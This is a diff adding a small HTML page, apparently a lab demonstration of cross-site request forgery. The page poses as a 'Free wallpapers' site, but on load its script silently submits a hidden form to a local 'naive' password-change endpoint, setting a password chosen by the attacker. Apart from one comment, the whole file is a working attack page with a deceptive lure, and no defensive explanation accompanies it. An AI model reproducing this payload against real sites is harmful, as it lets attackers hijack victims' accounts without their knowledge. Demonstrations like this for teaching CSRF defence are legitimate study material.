@@ -1,0 +1,9 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Free wallpapers</title>
+<h1>Loading your wallpapers...</h1>
+<!-- A form aimed at someone else's password page, sent as the page loads. -->
+<form id="w" method="post" action="http://localhost:8000/naive-change-password.php">
+    <input type="hidden" name="new_password" value="the attacker knows this one">
+</form>
+<script>document.getElementById('w').submit();</script>
